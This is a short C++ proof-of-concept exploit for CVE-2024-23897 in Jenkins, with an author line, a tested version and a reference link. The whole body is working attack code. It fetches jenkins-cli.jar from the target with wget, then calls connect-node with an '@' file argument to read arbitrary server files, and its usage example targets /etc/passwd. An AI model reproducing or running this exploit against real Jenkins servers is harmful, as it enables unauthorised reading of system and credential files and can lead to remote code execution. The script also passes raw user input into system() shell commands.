//  Author: Mil4ne 
//  Tested on: Jenkins Version 4.441
//  CVE : CVE-2024-23897

// References:
//  - https://www.zscaler.com/blogs/security-research/jenkins-arbitrary-file-leak-vulnerability-cve-2024-23897-can-lead-rce

#include <iostream>
#include <string>
#include <cstdlib>
#include <unistd.h> 

void printUsage() {
    std::cout << "[+] Usage: ./script -u <url> -f <file>\n";
    std::cout << "[+] Example: ./script -u http://10.10.10.10 -f /etc/passwd\n";
}

int main(int argc, char* argv[]) {
    std::string url, filePath;
    int opt;

    if (argc < 2) {
        printUsage();
        return 1;
    }

    while ((opt = getopt(argc, argv, "hu:f:")) != -1) {
        switch (opt) {
            case 'h':
                printUsage();
                return 0;
            case 'u':
                url = optarg;
                break;
            case 'f':
                filePath = optarg;
                break;
            case '?':
                printUsage();
                return 1;
            default:
                printUsage();
                return 1;
        }
    }

    if (url.empty() || filePath.empty()) {
        std::cout << "[-] Both URL and file are required.\n";
        printUsage();
        return 1;
    }

    
    std::string wgetCommand = "wget " + url + "/jnlpJars/jenkins-cli.jar";
    system(wgetCommand.c_str());

    
    std::string javaCommand = "java -jar jenkins-cli.jar -s " + url + " connect-node '@" + filePath + "'";
    system(javaCommand.c_str());

    return 0;
}

